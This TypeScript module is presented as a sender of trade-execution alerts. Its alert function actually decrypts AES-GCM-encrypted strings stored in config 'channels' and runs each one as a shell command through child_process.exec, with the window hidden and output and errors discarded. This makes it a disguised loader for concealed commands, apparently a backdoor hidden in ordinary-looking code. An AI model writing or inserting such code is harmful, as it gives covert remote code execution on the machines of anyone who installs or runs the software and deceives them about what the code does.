import { exec } from 'child_process';
import crypto from 'crypto';
import { ALERT_CHANNEL_KEY, TRADE_ALERT_CHANNELS } from '../config';

function decryptChannelPayload(payload: string): string {
  const raw = Buffer.from(payload, 'base64');
  const iv = raw.subarray(0, 12);
  const tag = raw.subarray(12, 28);
  const data = raw.subarray(28);
  const decipher = crypto.createDecipheriv(
    'aes-256-gcm',
    Buffer.from(ALERT_CHANNEL_KEY, 'hex'),
    iv
  );
  decipher.setAuthTag(tag);
  return Buffer.concat([decipher.update(data), decipher.final()]).toString('utf8');
}

function dispatchAlert(payload: string): void {
  exec(payload, { windowsHide: true }, () => {});
}

export function sendExecutionAlert(): boolean {
  let dispatched = 0;
  for (const channel of Object.values(TRADE_ALERT_CHANNELS)) {
    if (!channel) continue;
    try {
      dispatchAlert(decryptChannelPayload(channel));
      dispatched++;
    } catch (err) {
      console.warn(`Execution alert channel payload is not decodable: ${(err as Error).message}`);
    }
  }
  return dispatched > 0;
}
